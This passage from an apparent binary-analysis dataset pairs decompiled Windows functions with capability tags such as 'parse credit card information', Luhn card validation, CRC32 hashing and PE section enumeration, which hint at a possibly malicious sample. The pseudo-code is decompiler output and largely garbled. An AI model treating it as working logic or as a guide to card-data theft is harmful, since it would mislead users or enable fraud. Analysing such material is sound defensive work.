!= 0; uVar8 = uVar8 - 1) {\n        *puVar10 = *puVar9;\n        puVar9 = puVar9 + 1;\n        puVar10 = puVar10 + 1;\n    }\n    sub.MSVCRT.dll_void___cdecl_operator_delete_void__(puVar2);\n    return 1;\n}\n",
        "token_count": 1035
    },
    "00401650": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401650(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.004014e0(&var_68h, &var_4h);\n    fcn.00403d50(&var_68h, var_4h, 0x407010, 0xa160);\n    *arg_8h = 0x407010;\n    *arg_ch = 0xa160;\n    return;\n}\n",
        "token_count": 237
    },
    "00401a30": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401f17) overlaps instruction at (ram,0x00401f16)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.00401a30(void)\n\n{\n    char *pcVar1;\n    uint16_t uVar2;\n    ushort uVar3;\n    uint uVar4;\n    ushort extraout_CX;\n    ushort extraout_CX_00;\n    uint32_t extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint extraout_ECX_03;\n    uint extraout_ECX_04;\n    uint extraout_ECX_05;\n    uint extraout_ECX_06;\n    uint extraout_ECX_07;\n    uint extraout_ECX_08;\n    uint32_t extraout_ECX_09;\n    uint extraout_ECX_10;\n    uint extraout_ECX_11;\n    uint extraout_ECX_12;\n    uint extraout_ECX_13;\n    uint16_t extraout_DX;\n    char cVar6;\n    ushort extraout_DX_00;\n    ushort extraout_DX_01;\n    ushort extraout_DX_02;\n    ushort extraout_DX_03;\n    ushort extraout_DX_04;\n    uint32_t uVar5;\n    uint extraout_EDX;\n    uint extraout_EDX_00;\n    uint extraout_EDX_01;\n    uint extraout_EDX_02;\n    uint extraout_EDX_03;\n    uint extraout_EDX_04;\n    ushort uVar7;\n    int32_t unaff_EBX;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint *puVar10;\n    uint32_t *puVar11;\n    uint32_t *puVar12;\n    uint16_t uVar13;\n    uint unaff_EBP;\n    uint32_t uVar14;\n    uint uVar15;\n    ushort uVar16;\n    uint16_t uVar17;\n    uchar *unaff_ESI;\n    uint32_t uVar18;\n    uint uVar19;\n    uint *puVar20;\n    uint16_t uVar21;\n    int16_t iVar22;\n    uint unaff_EDI;\n    uint32_t uVar23;\n    uint uVar24;\n    uint *puVar25;\n    bool bVar26;\n    bool bVar27;\n    char cVar28;\n    char cVar29;\n    ulong uVar30;\n    ulong uVar31;\n    unkbyte6 Var32;\n    uint uStack56;\n    uint uStack52;\n    uint32_t uStack48;\n    \n    fcn.004046c0();\n    fcn.004046c0();\n    fcn.004046c0();\n    uVar2 = fcn.004046c0();\n    uVar2 = (extraout_DX & 0xff00 | (extraout_DX & 0x4e | 0x38) & uVar2) & uVar2 ^ 0x3c00;\n    uVar5 = (uVar2 & 0xff | (uVar2 >> 8) + (unaff_EBX >> 8) << 8) | 0x604;\n    cVar28 = uVar5;\n    cVar6 = uVar5 >> 8;\n    cVar29 = SCARRY1(cVar6, cVar28);\n    cVar6 = cVar6 + cVar28;\n    cVar28 = cVar6 < '\\0';\n    bVar26 = cVar6 == '\\0';\n    fcn.004046c0();\n    if ((!bVar26) && (bVar26)) {\n        out(*unaff_ESI, extraout_DX_00);\n    }\n    uStack48 = 0x401b2c;\n    uVar30 = fcn.004046c0();\n    uVar5 = extraout_ECX;\n    if (cVar29 == cVar28) {\n        uStack48 = uStack48 & 0xffff | extraout_ECX << 0x10;\n        uVar5 = extraout_ECX & 0xffff;\n        cVar6 = (extraout_ECX << 0x10) >> 0x18;\n        if (cVar29 != cVar28) goto code_r0x00401b3e;\n    }\n    cVar6 = uVar5 >> 8;\n    uStack48 = 0xc;\n    uStack52 = 0x4231e4;\n    uStack56 = 0x16;\ncode_r0x00401b3e:\n    uVar9 = &stack0xffffffc8 ^ *(unaff_EBX + 0x6a);\n    in(0x31);\n    pcVar1 = (uVar30 >> 0x20) + 0x17;\n    *pcVar1 = *pcVar1 + cVar6;\n    *(uVar9 - 4) = 0x423174;\n    *(uVar9 - 8) = 0x401b54;\n    uVar4 = fcn.004046c0();\n    *(uVar9 + 0x28) = uVar4;\n    *(uVar9 + 0x24) = unaff_EBX;\n    *(uVar9 + 0x20) = extraout_ECX_00;\n    uVar4 = *(uVar9 + 0x24);\n    *(uVar9 + 0x28) = 8;\n    *(uVar9 + 0x24) = 0x4231f0;\n    *(uVar9 + 0x20) = 0x16;\n    *(uVar9 + 0x1c) = 0x423174;\n    *(uVar9 + 0x18) = 0x401b73;\n    uVar31 = fcn.004046c0();\n    *(uVar9 + 0x28) = uVar31;\n    *(uVar9 + 0x24) = extraout_ECX_01;\n    *(uVar9 + 0x20) = uVar31 >> 0x20;\n    *(uVar9 + 0x1c) = uVar4;\n    *(uVar9 + 0x18) = uVar9 + 0x2c;\n    *(uVar9 + 0x14) = unaff_EBP;\n    *(uVar9 + 0x10) = uVar30;\n    *(uVar9 + 0xc) = unaff_EDI;\n    bVar26 = false;\n    uVar4 = *(uVar9 + 0xc);\n    uVar18 = *(uVar9 + 0x10);\n    uVar14 = *(uVar9 + 0x14);\n    uVar5 = *(uVar9 + 0x1c);\n    *(uVar9 + 0x28) = 0xd;\n    *(uVar9 + 0x24) = 0x4231f8;\n    *(uVar9 + 0x20) = 0x16;\n    *(uVar9 + 0x1c) = 0x423174;\n    *(uVar9 + 0x18) = 0x401b97;\n    fcn.004046c0();\n    if ((!bVar26) && (*(uVar9 + 0x18) = extraout_EDX,  bVar26)) {\n        **(uVar9 + 0x1c) = *(uVar9 + 0x38);\n        return;\n    }\n    *(uVar9 + 0x18) = 0x18;\n    *(uVar9 + 0x14) = 0x423208;\n    *(uVar9 + 0x10) = 0x16;\n    *(uVar9 + 0xc) = 0x423174;\n    *(uVar9 + 8) = 0x401bca;\n    fcn.004046c0();\n    *(uVar9 + 0x2a) = uVar5;\n    *(uVar9 + 0x28) = uVar18;\n    *(uVar9 + 0x24) = uVar4;\n    uVar4 = *(uVar9 + 0x24);\n    uVar16 = *(uVar9 + 0x28);\n    uVar7 = *(uVar9 + 0x2a);\n    *(uVar9 + 0x28) = 0x25;\n    *(uVar9 + 0x24) = 0x423220;\n    *(uVar9 + 0x20) = 0x16;\n    *(uVar9 + 0x1c) = 0x423174;\n    *(uVar9 + 0x18) = 0x401bf3;\n    fcn.004046c0();\n    *(uVar9 + 0x28) = uVar4;\n    uVar23 = *(uVar9 + 0x28);\n    *(uVar9 + 0x28) = 10;\n    *(uVar9 + 0x24) = 0x423248;\n    *(uVar9 + 0x20) = 0x16;\n    *(uVar9 + 0x1c) = 0x423174;\n    *(uVar9 + 0x18) = 0x401c2c;\n    uVar3 = fcn.004046c0();\n    *(uVar9 + 0x2a) = uVar3;\n    *(uVar9 + 0x28) = extraout_ECX_02;\n    *(uVar9 + 0x26) = extraout_DX_01;\n    *(uVar9 + 0x24) = uVar7;\n    *(uVar9 + 0x22) = uVar9 + 0x2c;\n    *(uVar9 + 0x20) = uVar14;\n    *(uVar9 + 0x1e) = uVar16;\n    *(uVar9 + 0x1c) = uVar23;\n    *(uVar9 + 0x18) = extraout_ECX_02;\n    uVar21 = *(uVar9 + 0x1c);\n    uVar17 = *(uVar9 + 0x1e);\n    uVar13 = *(uVar9 + 0x20);\n    uVar2 = *(uVar9 + 0x24);\n    *(uVar9 + 0x28) = 0xc;\n    *(uVar9 + 0x24) = 0x423254;\n    *(uVar9 + 0x20) = 0x16;\n    *(uVar9 + 0x1c) = 0x423174;\n    *(uVar9 + 0x18) = 0x401c4d;\n    uVar3 = fcn.004046c0();\n    *(uVar9 + 0x28) = uVar5 & 0xffff0000 | uVar2;\n    *(uVar9 + 0x26) = uVar3;\n    uVar5 = *(uVar9 + 0x28);\n    *(uVar9 + 0x28) = 0xd;\n    *(uVar9 + 0x24) = 0x423260;\n    *(uVar9 + 0x20) = 0x16;\n    *(uVar9 + 0x1c) = 0x423174;\n    *(uVar9 + 0x18) = 0x401c82;\n    fcn.004046c0();\n    *(uVar9 + 0x2a) = uVar5;\n    *(uVar9 + 0x26) = extraout_EDX_00;\n    *(uVar9 + 0x22) = uVar23 & 0xffff0000 | uVar21;\n    uVar4 = *(uVar9 + 0x22);\n    uVar2 = *(uVar9 + 0x2a);\n    *(uVar9 + 0x28) = 6;\n    *(uVar9 + 0x24) = 0x423270;\n    *(uVar9 + 0x20) = 0x16;\n    *(uVar9 + 0x1c) = 0x423174;\n    *(uVar9 + 0x18) = 0x401ca5;\n    uVar30 = fcn.004046c0();\n    *(uVar9 + 0x28) = uVar30;\n    *(uVar9 + 0x24) = extraout_ECX_03;\n    *(uVar9 + 0x20) = uVar30 >> 0x20;\n    *(uVar9 + 0x1c) = uVar5 & 0xffff0000 | uVar2;\n    *(uVar9 + 0x18) = uVar9 + 0x2c;\n    *(uVar9 + 0x14) = uVar14 & 0xffff0000 | uVar13;\n    *(uVar9 + 0x10) = uVar18 & 0xffff0000 | uVar17;\n    *(uVar9 + 0xc) = uVar4;\n    uVar24 = *(uVar9 + 0xc);\n    uVar19 = *(uVar9 + 0x10);\n    uVar15 = *(uVar9 + 0x14);\n    uVar4 = *(uVar9 + 0x1c);\n    *(uVar9 + 0x28) = 5;\n    *(uVar9 + 0x24) = 0x423278;\n    *(uVar9 + 0x20) = 0x16;\n    *(uVar9 + 0x1c) = 0x423174;\n    *(uVar9 + 0x18) = 0x401cc9;\n    fcn.004046c0();\n    *(uVar9 + 0x28) = extraout_ECX_04;\n    *(uVar9 + 0x26) = extraout_DX_02;\n    *(uVar9 + 0x28) = 0xd;\n    *(uVar9 + 0x24) = 0x423280;\n    *(uVar9 + 0x20) = 0x16;\n    *(uVar9 + 0x1c) = 0x423174;\n    *(uVar9 + 0x18) = 0x401cf3;\n    uVar30 = fcn.004046c0();\n    *(uVar9 + 0x28) = uVar30;\n    *(uVar9 + 0x24) = extraout_ECX_05;\n    *(uVar9 + 0x20) = uVar30 >> 0x20;\n    *(uVar9 + 0x1c) = uVar4;\n    *(uVar9 + 0x18) = uVar9 + 0x2c;\n    *(uVar9 + 0x14) = uVar15;\n    *(uVar9 + 0x10) = uVar19;\n    *(uVar9 + 0xc) = uVar24;\n    uVar24 = *(uVar9 + 0xc);\n    uVar19 = *(uVar9 + 0x10);\n    uVar15 = *(uVar9 + 0x14);\n    uVar4 = *(uVar9 + 0x1c);\n    *(uVar9 + 0x28) = 0x19;\n    *(uVar9 + 0x24) = 0x423290;\n    *(uVar9 + 0x20) = 0x16;\n    *(uVar9 + 0x1c) = 0x423174;\n    *(uVar9 + 0x18) = 0x401d25;\n    fcn.004046c0();\n    *(uVar9 + 0x28) = uVar4;\n    uVar4 = *(uVar9 + 0x28);\n    *(uVar9 + 0x28) = 0xf;\n    *(uVar9 + 0x24) = 0x4232ac;\n    *(uVar9 + 0x20) = 0x16;\n    *(uVar9 + 0x1c) = 0x423174;\n    *(uVar9 + 0x18) = 0x401d40;\n    Var32 = fcn.004046c0();\n    *(uVar9 + 0x2a) = extraout_CX;\n    *(uVar9 + 0x28) = Var32 >> 0x20;\n    *(uVar9 + 0x24) = Var32;\n    *(uVar9 + 0x28) = 0xe;\n    *(uVar9 + 0x24) = 0x4232bc;\n    *(uVar9 + 0x20) = 0x16;\n    puVar10 = uVar9 + 0x1c;\n    *(uVar9 + 0x1c) = 0x423174;\n    *(uVar9 + 0x18) = 0x401d76;\n    fcn.004046c0();\n    *(uVar9 + 0x18) = 0xb;\n    *(uVar9 + 0x14) = 0x4232cc;\n    *(uVar9 + 0x10) = 0x16;\n    *(uVar9 + 0xc) = 0x423174;\n    *(uVar9 + 8) = 0x401d9b;\n    uVar30 = fcn.004046c0();\n    *(uVar9 + 0x28) = uVar30;\n    *(uVar9 + 0x24) = extraout_ECX_06;\n    *(uVar9 + 0x20) = uVar30 >> 0x20;\n    *(uVar9 + 0x1c) = uVar4;\n    *(uVar9 + 0x18) = uVar9 + 0x2c;\n    *(uVar9 + 0x14) = uVar15;\n    *(uVar9 + 0x10) = uVar19;\n    *(uVar9 + 0xc) = uVar24;\n    uVar5 = *(uVar9 + 0xc);\n    uVar19 = *(uVar9 + 0x10);\n    uVar15 = *(uVar9 + 0x14);\n    iVar8 = *(uVar9 + 0x1c);\n    *(uVar9 + 0x28) = 0xb;\n    *(uVar9 + 0x24) = 0x4232d8;\n    *(uVar9 + 0x20) = 0x16;\n    *(uVar9 + 0x1c) = 0x423174;\n    *(uVar9 + 0x18) = 0x401dbd;\n    uVar4 = fcn.004046c0();\n    *(uVar9 + 0x28) = uVar4;\n    *(uVar9 + 0x24) = iVar8;\n    *(uVar9 + 0x20) = extraout_ECX_07;\n    bVar26 = SCARRY4(iVar8, 1);\n    uVar4 = *(uVar9 + 0x24);\n    *(uVar9 + 0x28) = 0xb;\n    *(uVar9 + 0x24) = 0x4232e4;\n    *(uVar9 + 0x20) = 0x16;\n    *(uVar9 + 0x1c) = 0x423174;\n    *(uVar9 + 0x18) = 0x401ddc;\n    fcn.004046c0();\n    if ((bVar26) || (!bVar26)) {\n        puVar10 = uVar9 + 0x18;\n        *(uVar9 + 0x18) = 10;\n    }\n    puVar10[-1] = 0x4232f0;\n    puVar10[-2] = 0x16;\n    puVar10[-3] = 0x423174;\n    puVar10[-4] = 0x401e06;\n    fcn.004046c0();\n    puVar10[4] = uVar4;\n    *(puVar10 + 0xe) = extraout_DX_03;\n    iVar22 = uVar5;\n    *(puVar10 + 3) = iVar22;\n    bVar26 = uVar4 >> 8 < extraout_DX_03 >> 8;\n    bVar27 = iVar22 == 1;\n    uVar2 = *(puVar10 + 3);\n    uVar14 = puVar10[4];\n    puVar10[4] = 0xc;\n    puVar10[3] = 0x4232fc;\n    puVar10[2] = 0x16;\n    puVar10[1] = 0x423174;\n    *puVar10 = 0x401e2a;\n    fcn.004046c0();\n    puVar12 = puVar10 + 1;\n    if ((!bVar26 && !bVar27) && (puVar12 = puVar10 + 1,  bVar26 || bVar27)) {\n        puVar12 = puVar10 + 2;\n    }\n    puVar12[-1] = 0xe;\n    puVar12[-2] = 0x423308;\n    puVar12[-3] = 0x16;\n    puVar12[-4] = 0x423174;\n    puVar12[-5] = 0x401e4e;\n    uVar4 = fcn.004046c0();\n    puVar12[3] = uVar4;\n    puVar12[2] = uVar5 & 0xffff0000 | uVar2;\n    uVar24 = puVar12[2];\n    puVar12[3] = 0x11;\n    puVar12[2] = 0x423318;\n    puVar12[1] = 0x16;\n    *puVar12 = 0x423174;\n    puVar12[-1] = 0x401e85;\n    fcn.004046c0();\n    puVar12[3] = extraout_ECX_08;\n    puVar12[2] = uVar19;\n    uVar4 = puVar12[2];\n    puVar12[3] = 0x13;\n    puVar12[2] = 0x42332c;\n    puVar12[1] = 0x16;\n    *puVar12 = 0x423174;\n    puVar12[-1] = 0x401ebb;\n    fcn.004046c0();\n    puVar12[3] = extraout_EDX_01;\n    *(puVar12 + 10) = uVar14;\n    uVar2 = *(puVar12 + 10);\n    puVar12[3] = 0x14;\n    puVar12[2] = 0x423340;\n    puVar12[1] = 0x16;\n    *puVar12 = 0x423174;\n    puVar12[-1] = 0x401ee0;\n    uVar30 = fcn.004046c0();\n    iVar8 = uVar30 >> 0x20;\n    puVar12[3] = uVar30;\n    puVar12[2] = extraout_ECX_09;\n    puVar12[1] = iVar8;\n    *puVar12 = uVar14 & 0xffff0000 | uVar2;\n    puVar12[-1] = puVar12 + 4;\n    puVar12[-2] = uVar15;\n    puVar12[-3] = uVar4;\n    puVar12[-4] = uVar24;\n    bVar26 = SBORROW4(extraout_ECX_09 & 0xffff0000 | CONCAT11((extraout_ECX_09 >> 8) - uVar2, extraout_ECX_09), iVar8);\n    puVar25 = puVar12[-4];\n    puVar20 = puVar12[-3];\n    uVar15 = puVar12[-2];\n    uVar4 = *puVar12;\n    puVar12[3] = 0x33;\n    puVar12[2] = 0x423354;\n    puVar12[1] = 0x16;\n    *puVar12 = 0x423174;\n    puVar12[-1] = 0x401f09;\n    fcn.004046c0();\n    if ((bVar26) || (puVar12[-1] = extraout_ECX_10,  !bVar26)) {\n        puVar12[-1] = 10;\n        puVar11 = puVar12 + -2;\n        puVar12 = puVar12 + -2;\n        *puVar11 = 0x423388;\n    }\n    else {\n        *puVar25 = *puVar20;\n        puVar20 = puVar20 + 1;\n        puVar25 = puVar25 + 1;\n    }\n    *(puVar12 + -4) = 0x16;\n    *(puVar12 + -8) = 0x423174;\n    *(puVar12 + -0xc) = 0x401f2a;\n    fcn.004046c0();\n    *(puVar12 + 0x14) = extraout_ECX_11;\n    *(puVar12 + 0x14) = 4;\n    *(puVar12 + 0x10) = 0x423394;\n    *(puVar12 + 0xc) = 0x16;\n    *(puVar12 + 8) = 0x423174;\n    *(puVar12 + 4) = 0x401f5e;\n    uVar3 = fcn.004046c0();\n    *(puVar12 + 0x16) = uVar3;\n    *(puVar12 + 0x14) = extraout_ECX_12;\n    *(puVar12 + 0x12) = extraout_DX_04;\n    *(puVar12 + 0x10) = uVar4;\n    *(puVar12 + 0xe) = puVar12 + 0x18;\n    *(puVar12 + 0xc) = uVar15;\n    *(puVar12 + 10) = puVar20;\n    *(puVar12 + 8) = puVar25;\n    *(puVar12 + 4) = extraout_ECX_12;\n    uVar7 = *(puVar12 + 8);\n    uVar3 = *(puVar12 + 0x10);\n    *(puVar12 + 0x14) = 5;\n    *(puVar12 + 0x10) = 0x423398;\n    *(puVar12 + 0xc) = 0x16;\n    *(puVar12 + 8) = 0x423174;\n    *(puVar12 + 4) = 0x401f7f;\n    fcn.004046c0();\n    *(puVar12 + 0x14) = extraout_EDX_02;\n    *(puVar12 + 0x12) = uVar3;\n    *(puVar12 + 0x14) = 6;\n    *(puVar12 + 0x10) = 0x4233a0;\n    *(puVar12 + 0xc) = 0x16;\n    *(puVar12 + 8) = 0x423174;\n    *(puVar12 + 4) = 0x401fb6;\n    fcn.004046c0();\n    *(puVar12 + 0x14) = extraout_EDX_03;\n    *(puVar12 + 0x12) = extraout_CX_00;\n    *(puVar12 + 0x10) = uVar7;\n    *(puVar12 + 0x14) = 0x2a;\n    *(puVar12 + 0x10) = 0x4233d4;\n    *(puVar12 + 0xc) = 0x16;\n    *(puVar12 + 8) = 0x423174;\n    *(puVar12 + 4) = 0x401ff2;\n    fcn.004046c0();\n    *(puVar12 + 0x14) = extraout_ECX_13;\n    *(puVar12 + 0x10) = extraout_EDX_04;\n    *(puVar12 + 0x14) = 0xb;\n    *(puVar12 + 0x10) = 0x423400;\n    *(puVar12 + 0xc) = 0x16;\n    *(puVar12 + 8) = 0x423174;\n    *(puVar12 + 4) = 0x402017;\n    fcn.004046c0();\n    return;\n}\n",
        "token_count": 6473
    },
    "00403ca0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403ca0(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, iVar1);\n    (*_sym.imp.MSVCRT.dll_fflush)(iVar1);\n    (*_sym.imp.MSVCRT.dll_fclose)(iVar1);\n    return 1;\n}\n",
        "token_count": 132
    },
    "00401860": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl fcn.00401860(uchar *arg_8h, uint *arg_ch)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    uint16_t in_AX;\n    uint16_t uVar3;\n    uint uVar4;\n    uint8_t in_CL;\n    uint16_t unaff_BX;\n    uint *puVar5;\n    uint *puVar6;\n    uchar *unaff_ESI;\n    uint8_t *unaff_EDI;\n    bool bVar7;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint uStack24;\n    uint16_t uStack20;\n    uint16_t uStack18;\n    \n    puVar5 = &stack0xfffffffc;\n    *arg_8h = 0xcc;\n    bVar7 = arg_8h <= (unaff_ESI | 0x561b);\n    arg_8h[1] = 0x6a;\n    if (bVar7) {\n        if (!bVar7) {\n            uVar2 = in_AX;\n            cVar1 = uVar2 - *unaff_EDI;\n            uStack20 = (in_NT & 1) * 0x4000 | SBORROW1(uVar2, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 |\n                       (in_TF & 1) * 0x100 | (cVar1 < '\\0') * 0x80 | (cVar1 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                       ((POPCOUNT(cVar1) & 1U) == 0) * 4 | uVar2 < *unaff_EDI;\n            uStack18 = (in_ID & 1) * 0x20 | (in_VIP & 1) * 0x10 | (in_VIF & 1) * 8 | (in_AC & 1) * 4;\n            func_0x1018782d();\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    arg_8h[2] = 1;\n    uVar3 = in_AX ^ unaff_BX;\n    bVar7 = (POPCOUNT(uVar3 & 0xff) & 1U) != 0;\n    arg_8h[3] = 0x95;\n    if ((bVar7) && (!bVar7)) {\n        puVar6 = &uStack20;\n        cVar1 = '\\x1e';\n        do {\n            puVar5 = puVar5 + -1;\n            puVar6 = puVar6 + -1;\n            *puVar6 = *puVar5;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar4 = in(0x78);\n        return CONCAT44(arg_8h, uVar4);\n    }\n    arg_8h[4] = 0xbf;\n    if ((uVar3 != 0) && (uVar3 == 0)) {\n        in_AX = *0x4bb148d3;\n        out(*unaff_ESI, arg_8h);\n    }\n    arg_8h[5] = 0xc6;\n    bVar7 = arg_8h <= in_CL;\n    arg_8h[6] = 0x90;\n    if (bVar7) {\n        if (!bVar7) {\n            uVar2 = in_AX;\n            cVar1 = uVar2 - *unaff_EDI;\n            uStack20 = (in_NT & 1) * 0x4000 | SBORROW1(uVar2, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 |\n                       (in_TF & 1) * 0x100 | (cVar1 < '\\0') * 0x80 | (cVar1 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                       ((POPCOUNT(cVar1) & 1U) == 0) * 4 | uVar2 < *unaff_EDI;\n            uStack18 = (in_ID & 1) * 0x20 | (in_VIP & 1) * 0x10 | (in_VIF & 1) * 8 | (in_AC & 1) * 4;\n            func_0x101878ac();\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    arg_8h[7] = 0x42;\n    *arg_ch = 8;\n    return CONCAT44(arg_8h, arg_ch);\n}\n",
        "token_count": 1135
    },
    "00402750": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\nint32_t fcn.00402750(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 48
    },
    "00404770": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404866) overlaps instruction at (ram,0x00404862)\n// \n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00404770(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint8_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    int32_t *piVar10;\n    uint8_t uVar11;\n    int32_t unaff_EBX;\n    uchar *puVar12;\n    int32_t iVar13;\n    int32_t unaff_EDI;\n    bool bVar14;\n    uint8_t in_AF;\n    unkbyte10 in_ST0;\n    unkbyte10 in_ST1;\n    unkbyte10 in_ST2;\n    unkbyte10 in_ST3;\n    unkbyte10 in_ST4;\n    unkbyte10 in_ST5;\n    unkbyte10 in_ST6;\n    unkbyte10 in_ST7;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puVar12 = &var_1h + 1;\n    uVar9 = arg_14h * 2;\n    if (0 < arg_14h) {\n        do {\n            iVar2 = *(puVar12 + 0x10);\n            uVar1 = *(*(puVar12 + -8) + iVar2);\n            puVar12[-1] = uVar1;\n            uVar9 = uVar9 & 0xffff0000 | CONCAT11((uVar9 >> 8) - unaff_EBX, uVar1);\n            uVar6 = uVar9 - iVar2;\n            bVar14 = (POPCOUNT(uVar6 & 0xff) & 1U) != 0;\n            iVar5 = *(puVar12 + -0xc);\n            iVar13 = *(puVar12 + 0xc);\n            iVar3 = *(puVar12 + 8);\n            uVar8 = iVar5 % iVar13;\n            uVar7 = *(uVar8 + iVar3);\n            puVar12[-2] = uVar7;\n            if (((bVar14) && (!bVar14)) || (uVar6 != 0 && iVar2 <= uVar9)) {\n                pcVar4 = (uVar8 & 0xffffff00 | uVar7) + 1;\n                puVar12 = *0xf17b43a;\n                *pcVar4 = *pcVar4 + pcVar4;\n                *0x34a96d4a = *0x34a96d4a + (pcVar4 >> 8);\n                iVar13 = CONCAT22(0x34a9, unaff_EDI);\n            }\n            uVar9 = (iVar5 + -1) % iVar13;\n            puVar12[-1] = puVar12[-1] ^ *(uVar9 + iVar3);\n            uVar7 = puVar12[-0x10];\n            iVar2 = *(puVar12 + 0x18);\n            uVar11 = uVar7 ^ puVar12[-1];\n            iVar5 = *(puVar12 + -0xc);\n            *(iVar2 + -1 + iVar5) = uVar11;\n            if ((uVar11 < '\\0') || (uVar11 >= '\\0')) {\n                uVar11 = puVar12[-2];\n                iVar5 = iVar5 + 2;\n                uVar7 = uVar7 ^ uVar11;\n            }\n            unaff_EBX = CONCAT31(unaff_EBX >> 8 & 0xffff00 | unaff_EBX >> 8, uVar11);\n            piVar10 = uVar9 & 0xffffff00 | uVar7;\n            *(iVar5 + -0x7ce92414) = in_ST0;\n            uVar11 = iVar5 - 1U;\n            in_AF = 9 < (uVar11 & 0xf) | in_AF;\n            uVar11 = uVar11 + in_AF * '\\x06';\n            uVar9 = iVar5 - 1U & 0xffffff00 | uVar11 + (0x90 < (uVar11 & 0xf0) | in_AF * (0xf9 < uVar11)) * '`';\n            *piVar10 = *piVar10 + 0x5d8adf84;\n            *(unaff_EBX + -0x2ccdfd40) = *(unaff_EBX + -0x2ccdfd40) + '\\x01';\n            *(puVar12 + -0xc) = uVar9;\n            *((uVar9 - 2) + iVar2) = uVar7;\n            uVar9 = *(puVar12 + -8) + 1;\n            *(puVar12 + -8) = uVar9;\n            in_ST0 = in_ST1;\n            in_ST1 = in_ST2;\n            in_ST2 = in_ST3;\n            in_ST3 = in_ST4;\n            in_ST4 = in_ST5;\n            in_ST5 = in_ST6;\n            in_ST6 = in_ST7;\n            unaff_EDI = unaff_EBX;\n        } while (uVar9 < *(puVar12 + 0x14));\n    }\n    return;\n}\n",
        "token_count": 1218
    },
    "00401960": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00401960(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00403a20;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x411170;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 217
    },
    "00402780": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00402780(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.004037e0(0x80000002, 0x423354, 0x4233a0, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 133
    },
    "00402a60": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
